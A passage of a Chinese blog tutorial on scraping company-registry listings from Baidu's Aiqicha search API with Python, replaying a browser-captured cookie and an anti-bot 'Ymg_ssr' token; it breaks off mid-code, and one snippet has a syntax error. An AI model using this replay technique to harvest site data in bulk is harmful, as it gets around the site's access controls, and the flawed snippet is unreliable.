00\u5c55\u7ecf\u8425\u6d3b\u52a8)\u3002&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;regNo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;91320322MA1X36PF3D&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;appJumpUrl&quot;</span><span class="punctuation">:</span> <span class="string">&quot;aiqicha:\/\/open.app?params=&#123;\&quot;naModule\&quot;:\&quot;\/aqc\/detail\&quot;,\&quot;naParam\&quot;:\&quot;&#123;\\\&quot;pid\\\&quot;:\\\&quot;91770835364651\\\&quot;&#125;\&quot;&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;labels&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;opening&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personTitle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u6cd5\u5b9a\u4ee3\u8868\u4eba&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;personId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0fa179597fa8aaccf6f6ae44062f8a24&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;newLabels&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="punctuation">&#123;</span></span><br><span class="line">                        <span class="attr">&quot;key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;opening&quot;</span><span class="punctuation">,</span></span><br><span class="line">                        <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                            <span class="attr">&quot;text&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\u5f00\u4e1a&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;style&quot;</span><span class="punctuation">:</span> <span class="string">&quot;blue&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;fontColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#1EA830&quot;</span><span class="punctuation">,</span></span><br><span class="line">                            <span class="attr">&quot;bgColor&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#EBF7EC&quot;</span></span><br><span class="line">                        <span class="punctuation">&#125;</span></span><br><span class="line">                    <span class="punctuation">&#125;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>选取部分字段如<br>“entName”: “\u946b\u6e90\u9e3f\u660a(\u5929\u6d25)\u79d1\u6280\u6709\u9650\u516c\u53f8”,<br>“regCap”: “1,011,000,000.0\u4e07”,</p><p>进行解密:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011547330.png" alt="image.png"></p><p>发现解密结果对应了页面所要抓取的信息<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011548084.png" alt="image.png"></p><h1 id="3-程序编写"><a href="#3-程序编写" class="headerlink" title="3.程序编写"></a>3.程序编写</h1><p>1.保存访问请求头:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Accept:</span><br><span class="line">application/json, text/plain, */*</span><br><span class="line">Accept-Encoding:</span><br><span class="line">gzip, deflate, br</span><br><span class="line">Accept-Language:</span><br><span class="line">zh-CN,zh;q=0.9</span><br><span class="line">Connection:</span><br><span class="line">keep-alive</span><br><span class="line">Cookie: “抓到的cookie”</span><br><span class="line">Host:</span><br><span class="line">aiqicha.baidu.com</span><br><span class="line">Referer:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br><span class="line">Sec-Ch-Ua:</span><br><span class="line">&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;</span><br><span class="line">Sec-Ch-Ua-Mobile:</span><br><span class="line">?0</span><br><span class="line">Sec-Ch-Ua-Platform:</span><br><span class="line">&quot;Windows&quot;</span><br><span class="line">Sec-Fetch-Dest:</span><br><span class="line">empty</span><br><span class="line">Sec-Fetch-Mode:</span><br><span class="line">cors</span><br><span class="line">Sec-Fetch-Site:</span><br><span class="line">same-origin</span><br><span class="line">User-Agent:</span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36</span><br><span class="line">X-Requested-With:</span><br><span class="line">XMLHttpRequest</span><br><span class="line">Ymg_ssr:</span><br><span class="line">1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre</span><br><span class="line">Zx-Open-Url:</span><br><span class="line">https://aiqicha.baidu.com/advancesearch/list</span><br></pre></td></tr></table></figure><p>爬取代码前根据请求头制作headers</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.构造params参数如图所示</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.爬虫实现代码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    resultList = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> resultList:</span><br><span class="line">        <span class="built_in">print</span>(item)</span><br><span class="line">        <span class="built_in">print</span>(item[<span class="string">&#x27;entName&#x27;</span>])</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>4.成功爬取结果:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011550787.png" alt="image.png"></p><p>与browser访问一致<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551205.png" alt="image.png"></p><p>5.爬取内容后保存至文件中</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: <span class="string">&quot;1&quot;</span>.</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011551558.png" alt="image.png"></p><p>6.爬取多页信息</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓到的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span class="string">&#x27;&quot;Not.A/Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;114&quot;, &quot;Google Chrome&quot;;v=&quot;114&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua-Platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Fetch-Site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;X-Requested-With&#x27;</span>: <span class="string">&#x27;XMLHttpRequest&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Ymg_ssr&#x27;</span>: <span class="string">&#x27;1686132225976_1686209020456_Krd2ws59qA1TALmBzJb0wdzDayRK14xrDbs2NsxGZghPtW2AaG8K4Now6K/zTfBecE9i1aegJL5KTT+cxrK6j9JK2ix9MoT8+qWljBqcj0i1PEU+RTVvgGjdlkPqamJydND6fQSkBidmHrZVhBXKSiqByC1knHzxmFJl0d+FYKOIK5Yue9P/KBLU2Q3FIF1YsrkslH8qYriHAg5MNXzRTlrU4gdLir4fXP++E+JwOUR2jkA8Mv4vTuUOG7crcKk2W+omKed78e4P6vi6j3qgdk6Pc4jel6aItYE8iTIAZCAcJNP4raFja3p6Eb/KAqre&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Zx-Open-Url&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    url = <span class="string">&quot;https://aiqicha.baidu.com/s/advanceSearchAjax&quot;</span></span><br><span class="line">    response = requests.get(url, headers=headers, params=params)</span><br><span class="line">    result = response.json()[<span class="string">&quot;data&quot;</span>][<span class="string">&quot;resultList&quot;</span>]</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> result:</span><br><span class="line">        a = <span class="string">&quot;公司名称:&quot;</span>+item[<span class="string">&#x27;entName&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;注册资金:&quot;</span>+item[<span class="string">&#x27;regCap&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司类型:&quot;</span>+item[<span class="string">&#x27;entType&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司成立时间:&quot;</span>+item[<span class="string">&#x27;validityFrom&#x27;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&quot;公司地址:&quot;</span>+item[<span class="string">&quot;domicile&quot;</span>]+<span class="string">&#x27;    &#x27;</span>+<span class="string">&#x27;开业状况:&#x27;</span>+item[<span class="string">&quot;openStatus&quot;</span>]+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">        f.write(a)</span><br><span class="line"></span><br><span class="line">    f.close()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main(<span class="number">1</span>)</span><br><span class="line">    main(<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>成功爬取<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202307011552327.png" alt="image.png"></p><p>运用for循环爬取多页</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">n</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment">#写入文件</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;./a.txt&quot;</span>, <span class="string">&quot;a&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = <span class="built_in">str</span>(n)</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&quot;p&quot;</span>: m,</span><br><span class="line">        <span class="string">&quot;s&quot;</span>: <span class="string">&quot;10&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;&#123;&quot;regCap&quot;:[&#123;&quot;start&quot;:5000,&quot;end&quot;:0&#125;],&quot;regCapType&quot;:[&quot;1&quot;],&quot;openStatus&quot;:[&quot;开业&quot;]&#125;&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;o&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json, text/plain, */*&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate, br&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">        <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Cookie&quot;</span>: <span class="string">&#x27;抓取的cookie&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;aiqicha.baidu.com&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;https://aiqicha.baidu.com/advancesearch/list&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Sec-Ch-Ua&#x27;</span>: <span 